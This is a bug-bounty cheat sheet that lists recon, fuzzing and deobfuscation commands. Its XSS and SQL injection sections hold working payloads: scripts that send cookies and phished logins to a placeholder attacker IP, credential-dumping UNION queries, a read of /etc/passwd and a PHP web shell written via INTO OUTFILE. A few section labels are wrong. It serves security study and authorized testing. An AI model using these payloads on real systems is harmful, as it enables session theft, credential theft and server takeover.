# Bug Bounty

Overview
---------
1. - [Web Requests](#1---web-requests)
2. - [Web Proxies](#2---web-proxies)
3. - [Web Application Vulnerability Scanners](#3---web-application-vulnerability-scanners)
4. - [Online Resources](#4---online-resources)
5. - [Browser Plugins](#5---browser-plugins)
6. - [Web Reconnaissance](#6---web-reconnaissance)
7. - [Fuzzing](#7---fuzzing)
8. - [JavaScript Deobfuscation](#8---javascript-deobfuscation)
9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
10. - [SQL Injection](#9---sql-injection)
11. - [Sensitive Data Exposure](#10---sensitive-data-exposure)
12. - [HTML Injection](#11---html-injection)
13. - [Cross-Site Request Forgery (CSRF)](#12---cross-site-request-forgery-csrf)
14. - [Exploit Research](#13---exploit-research)

   
#1. - Web Requests
-----------------------------------------

- Curl

```
$ curl -v <URL>
$ curl -I <URL>
$ curl -i <URL>
$ curl -v -X OPTIONS <URL>
$ curl -u admin:admin <URL>
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' <URL>
$ curl <URL>/search.php?search=test
$ curl -X POST -d 'username=admin&password=admin' <URL>
$ curl -X POST -d '{"search":"test"}' -H 'Content-Type: application/json' <URL>
$ curl <URL>.php -X POST -d 'param1=key' -H 'Content-Type: application/x-www-form-urlencoded'
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
$ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
```

- DevTools

```
F12
```

#2. - Web Proxies
-----------------------------------------

- Burp Suite

```
Proxy -> Intercept -> Open Browser
OR
Settings -> Network Settings -> Settings -> Select Manual proxy configuration -> Enter IP address and port of our proxy -> Select Use this proxy server for all protocols 
```

- ZAP Proxy

```
Firefox Icon
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

#3. - Web Application Vulnerability Scanners
-----------------------------------------

- Nessus

```
https://www.tenable.com/products/nessus/nessus-essentials
```

- Burp Suite

```
https://portswigger.net/burp
```

- ZAP Proxy

```
https://www.zaproxy.org/
```

#4. - Online Resources
-----------------------------------------

- OWASP Web Security Testing Guide

```
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
```

- PayloadsAllTheThings

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
```

- HTML - CSS - JS Online Editor

```
https://html-css-js.com/
```

- HTML WYSIWYG Online Editor

```
https://htmlg.com/html-editor/
```

- JSFiddle Code Playground

```
https://jsfiddle.net/
```

#5. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#6. - Web Reconnaissance
-----------------------------------------

- Whois

```
$ whois <Domain Name>
https://whoisfreaks.com/
```

- DNS

```
Edit /etc/hosts OR C:\Windows\System32\drivers\etc\hosts
$ sudo sh -c 'echo "<IP address>  <Domain Name>" >> /etc/hosts'
$ dig <Domain Name>
$ dig <Domain Name> NS
$ dig <Domain Name> MS
$ dig @1.1.1.1 <Domain Name>
$ dig +trace <Domain Name>
$ dig -x <IP address>
$ dig +short <Domain Name>
$ dig <Domain Name> ANY
$ dig axfr @<Name Server> <Domain Name>
C:\> nslookup <IP address/Domain Name>
$ host <IP address/Domain Name>
$ host -t ns <Domain Name>
$ host -t mx <Domain Name>
$ host -t txt <Domain Name>
$ host -l <Domain Name> <DNS server name/IP address>
$ dnsenum <Domain Name>
$ dnsenum --enum <Domain Name> -f <wordlist> -r
$ dnsrecon -d <Domain Name> -t axfr
$ fierce --domain <Domain Name> --subdomains accounts admin ads
$ theHarvester -d <Domain Name> -b google > google.txt
$ amass enum -d <Domain Name>
$ assetfinder <Domain Name>
$ puredns bruteforce <wordlist> <Domain Name>
$ gobuster vhost -u http://<IP address> -w <wordlist> --append-domain
$ feroxbuster -w <wordlist> -u <URL>
$ ffuf -w <wordlist> -u http://<IP address> -H "HOST: FUZZ.<Domain Name>"
https://crt.sh/
$ curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
https://search.censys.io/
```

- Fingerprinting

```
$ curl -I <URL/Domain Name>
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
https://builtwith.com/
$ whatweb <Domain Name>
$ nmap -O -sC <IP address>
https://searchdns.netcraft.com/
$ wafw00f <Domain Name>
$ nikto -h <Domain Name> -Tuning b
```

- Robots.txt

```
http://<Domain Name>/robots.txt
```

- Well-Known URLs

```
https://<Domain Name>/.well-known/security.txt
https://<Domain Name>/.well-known/change-password
https://<Domain Name>/.well-known/openid-configuration
https://<Domain Name>/.well-known/assetlinks.json
https://<Domain Name>/.well-known/mta-sts.txt
```

- Web Crawlers

```
Burp Suite Spider
OWASP ZAP
Scrapy
Apache Nutch
$ python3 ReconSpider.py <URL>
```

- Scrapy Web Crawler

```
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)

$ jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

- Search Engines

```
https://www.exploit-db.com/google-hacking-database
site:example.com
inurl:login
filetype:pdf
intitle:"confidential report"
intext:"password reset"
cache:example.com
link:example.com
related:example.com
info:example.com
define:phishing
site:example.com numrange:1000-2000
allintext:admin password reset
allinurl:admin panel
allintitle:confidential report 2023
site:example.com AND (inurl:admin OR inurl:login)
"linux" OR "ubuntu" OR "debian"
site:bank.com NOT inurl:login
site:socialnetwork.com filetype:pdf user* manual
site:ecommerce.com "price" 100..500
"information security policy"
site:news.com -inurl:sports
```

- Web Archives

```
https://web.archive.org/
```

- Automated Recon

```
$ python finalrecon.py --headers --whois --url <URL>
$ python finalrecon.py --full --url <URL>
Recon-ng
theHarvester
SpiderFoot
OSINT Framework
```

#7. - Fuzzing
-----------------------------------------

- Directory Fuzzing

```
$ ffuf -w <wordlist>:FUZZ        # assign wordlist to a keyword
$ ffuf -w <wordlist> -u http://<Domain Name>/FUZZ
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ
```

- Extension Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/indexFUZZ
```

- Page Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/FUZZ.php
```

- Recursive Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

- Sub-Domain Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u https://FUZZ.<Domain Name>
```

- VHOST Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>'
```

- Filter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>' -fs 900
```

- GET Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php?FUZZ=key -fs 900
```

- POST Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

- Parameter Value Fuzzing

```
$ for i in $(seq 1 1000); do echo $i >> ids.txt; done        # create text file with numbers 1-1000
$ ffuf -w ids.txt:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

#8 - JavaScript Deobfuscation
-----------------------------------------

- JavaScript Obfuscator

```
https://beautifytools.com/javascript-obfuscator.php
https://obfuscator.io/
https://jsfuck.com/
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html
```

- JavaScript Beautifier

```
https://beautifytools.com/javascript-beautifier.php
Browser Dev Tools -> Pretty Print
https://prettier.io/playground/
https://beautifier.io/
```

- JavaScript Deobfuscator

```
https://matthewfl.com/unPacker.html
http://www.jsnice.org/
```

- JavaScript Console Debugger

```
https://jsconsole.com/
```

- JavaScript Minifier

```
https://www.toptal.com/developers/javascript-minifier
```

- Base64 Encode/Decode

```
$ echo <string> | base64
$ echo <base64 string> | base64 -d
```

- Hex Encode/Decode

```
$ echo <string> | xxd -p
$ echo <hex string> | xxd -p -r
```

- ROT13 Encode/Decode

```
$ echo <string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
$ echo <ROT13 string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
https://rot13.com/
```

- Cipher Identifier & Analyzer

```
https://www.boxentriq.com/code-breaking/cipher-identifier
```

#9. - Cross-Site Scripting (XSS)
-----------------------------------------

*Reflected XSS (non-persistent - processed on the back-end server)	= Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).*

*Stored XSS (persistent) = Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).*

*DOM XSS (non-persistent - processed on the client-side)	= Occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server and is written to an HTML DOM object (e.g., through client-side HTTP parameters or anchor tags - vulnerable username or page title).*

- Basic XSS Payloads

```
<script>alert("XSS")</script>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<plaintext>
<script>print()</script> 
```

- HTML XSS Payloads

```
<img src="" onerror=alert(window.origin)>	
```

- Deface XSS Payloads

```
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Old Milks</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="Fattest Milks"> </p></center>'</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
<script>document.getElementById('urlform').remove();</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

- Remote Script XSS Payloads

```
<script src="http://<IP address>/script.js"></script>	
```

- Cookie XSS Payloads

```
<script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
```

- DOM XSS Payloads

```
#"><img src=/ onerror=alert(document.cookie)>
<img src="" onerror=alert(window.origin)>
```

- Bulk XSS Payloads

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list
```

- Automated XSS

```
$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"
https://github.com/rajeshmajumdar/BruteXSS
https://github.com/epsylon/xsser
```

#10. - SQL Injection
-----------------------------------------

- SQL Login

```
$ mysql -u <username> -h <hostname> -P 3306 -p
```

- SQL General Commands

```
SHOW DATABASES
USE users
```

- SQL Table Commands

```
CREATE TABLE logins (id INT, ...)
SHOW TABLES
DESCRIBE logins
INSERT INTO table_name VALUES (value_1,..)
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>
```

- SQL Column Commands

```
SELECT * FROM table_name
SELECT column1, column2 FROM table_name
DROP TABLE logins
ALTER TABLE logins ADD newColumn INT
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn
ALTER TABLE logins MODIFY oldColumn DATE
ALTER TABLE logins DROP oldColumn
```

- SQL Output Commands

```
SELECT * FROM logins ORDER BY column_1
SELECT * FROM logins ORDER BY column_1 DESC
SELECT * FROM logins ORDER BY column_1 DESC, id ASC
SELECT * FROM logins LIMIT 2
SELECT * FROM logins LIMIT 1, 2
SELECT * FROM table_name WHERE <condition>
SELECT * FROM logins WHERE username LIKE 'admin%'
```

- SQL Auth Bypass

```
admin' or '1'='1
admin')-- -
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

- SQL Union Injection

```
' order by 1-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,@@version,3,4-- -
UNION select username, 2, 3, 4 from passwords-- -
```

- SQL DB Enumeration

```
SELECT @@version
SELECT SLEEP(5)
cn' UNION select 1,database(),2,3-- -
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

- SQL Privilege Checks

```
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

- SQL File Injection

```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

#11. - Sensitive Data Exposure
-----------------------------------------

- Source Code

```
Right-click -> View page source
OR
CTRL + U
```

#12. - HTML Injection
-----------------------------------------

- Hyperlink

```
<a href="http://www.google.com">Click Me</a>
```


#13. - Cross-Site Request Forgery (CSRF)
-----------------------------------------

- Password Change

```
"><script src=//www.example.com/exploit.js></script>
```

#14. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```
